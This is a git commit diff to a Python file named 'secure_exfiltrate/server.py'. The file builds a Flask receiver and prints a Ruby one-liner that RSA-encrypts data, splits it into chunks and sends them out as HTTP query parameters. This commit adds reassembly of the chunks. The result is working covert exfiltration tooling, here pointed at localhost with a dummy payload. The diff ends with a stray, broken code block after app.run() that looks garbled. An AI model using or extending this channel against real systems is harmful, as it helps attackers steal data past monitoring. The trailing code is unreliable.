83abcad430522a189f49f4206905bc79929074c1
Dave Buchanan <dave@joesvolcano.net>
2023-11-20 14:33:15 -0800

    Now it completely works, chunking and re-assembling data

--- secure_exfiltrate/server.py
+++ secure_exfiltrate/server.py
@@ -3,9 +3,9 @@
 from flask import Flask, request
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 import base64
+from collections import defaultdict
 
 app = Flask(__name__)
 
@@ -30,16 +30,22 @@ payload = "hello world " * 1000
 public_key = OpenSSL::PKey::RSA.new("{pub}")
 chunks = payload.scan(/.{"{"}1,#{"{"}public_key.n.num_bytes - 42{"}"}{"}"}/)
 midx = (0...10).map {"{"} ('a'..'z').to_a[rand(26)] {"}"}.join
-chunks.each_with_index {"{"} |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("http://localhost:5000/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts response.body {"}"}
+chunks.each_with_index {"{"} |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("http://127.0.0.1:5000/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts response.body {"}"}
 '''
 
 print(ruby_code)
+
+# Create a dictionary to store the chunks for each message ID
+message_chunks = defaultdict(list)
 
 # Step 2: Implement Flask server
 @app.route('/', methods=['GET'])
 def handle_request():
     try:
         encrypted_data = request.args.get('n')
+        message_id = request.args.get('m')
+        total_chunks = int(request.args.get('z'))
+
         print(f"Received encrypted data: {encrypted_data}")  # Logging the received data
 
         encrypted_data_bytes = base64.b64decode(encrypted_data)
@@ -51,6 +57,16 @@ def handle_request():
         )
 
         print(f"Decrypted data: {decrypted_data}")  # Logging the decrypted data
+
+        # Store the decrypted chunk for the corresponding message ID
+        message_chunks[message_id].append(decrypted_data)
+
+        # Check if we have received all the chunks for the message ID
+        if len(message_chunks[message_id]) == total_chunks:
+            # Concatenate all the chunks to form the complete message
+            complete_message = b''.join(message_chunks[message_id])
+            print(f"Complete message for message ID {message_id}: {complete_message.decode()}")
+
         return decrypted_data
     except Exception as e:
         print(f"Error: {str(e)}")  # Detailed error logging
@@ -59,3 +75,9 @@ def handle_request():
 
 if __name__ == '__main__':
     app.run()
+    # BEGIN: ed8c6549bwf9
+    def handle_request():
+        message_chunks = defaultdict(list)
+        # END: ed8c6549bwf9
+
+
